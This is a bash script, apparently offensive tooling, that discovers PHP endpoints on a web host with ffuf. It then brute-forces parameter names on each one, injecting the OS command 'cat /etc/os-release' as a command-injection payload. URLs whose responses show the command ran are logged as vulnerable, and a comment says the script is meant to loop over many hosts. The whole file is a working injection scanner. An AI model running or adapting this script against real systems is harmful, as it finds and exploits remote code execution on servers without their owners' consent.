#!/usr/bin/env bash
set -euo pipefail

# This script must receive the list of HOSTS to iterate through

HOST="127.0.0.1:8081"
BASE="http://$HOST"
ENDPOINT_WORDLIST="wordlists/php_scripts.txt"
PARAM_WORDLIST="wordlists/params.txt"
OUTDIR="results"
VULNERABLE_EDNPOINTS="results/vulnerable_endpoints.txt"
EXISTING_ENDPOINTS="results/${HOST}_endpoints.txt"
mkdir -p "${OUTDIR}"

FFUF_OUT="${OUTDIR}/endpoints.ffuf"
CLEAN="${OUTDIR}/endpoint.clean"

echo "[*] Running ffuf to discover endpoints..."
# run ffuf; use tee so we keep raw copy too
ffuf -u "${BASE}/FUZZ" -w "${ENDPOINT_WORDLIST}" -e .php -t 100 -mc 200 | tee "${FFUF_OUT}"

# sanitize ffuf output:
# 1) remove ANSI escape sequences (colors)
# 2) extract the first whitespace-separated token (the endpoint)
# 3) remove CRs, trim whitespace, dedupe
# 4) write to CLEAN
sed -r 's/\x1B\[[0-9;]*[mK]//g' "${FFUF_OUT}" \
  | awk '{print $1}' \
  | tr -d '\r' \
  | sed -E 's/^[[:space:]]+//; s/[[:space:]]+$//' \
  | grep -v '^$' \
  | sort -u > "${CLEAN}" || true

echo "[*] Found $(wc -l < "${CLEAN}") endpoints. Listing (with line numbers):"
sed "s/^/http:\/\/$HOST\//g" "${CLEAN}" | tee "$EXISTING_ENDPOINTS"
echo

echo "[*] Starting endpoint verification..."
# safe read: handles last line without newline
while IFS= read -r raw_php_script || [ -n "${raw_php_script:-}" ]; do
    # remove any stray ANSI bytes and trim whitespace again just in case
    php_script="$(printf '%s' "${raw_php_script}" \
                  | sed -r 's/\x1B\[[0-9;]*[mK]//g' \
                  | tr -d '\r' \
                  | sed -E 's/^[[:space:]]+//; s/[[:space:]]+$//')"

    # skip empty lines
    [[ -z "${php_script}" ]] && continue

    # normalize (remove leading slash if present)
    php_script="${php_script#/}"


	while IFS= read -r param ; do
        value="cat%20/etc/os-release"
		url=$(printf '%s/%s?%s=%s\n' "$BASE" "$php_script" "$param" "$value")
		printf '%s\n' '----------------------------------------'

		printf '%s\n' "$url"

        # Perform request
        resp=$(curl -s --max-time 10 "${url}" || true)

		# print the url & response if the response contains the word "NAME"
        if printf '%s' "$resp" | grep -q 'NAME'; then
            printf '%s\n' "$resp"

			echo "$url" >> "$VULNERABLE_EDNPOINTS"
        fi

        sleep 0.02
    done < "${PARAM_WORDLIST}"


done < "${CLEAN}"
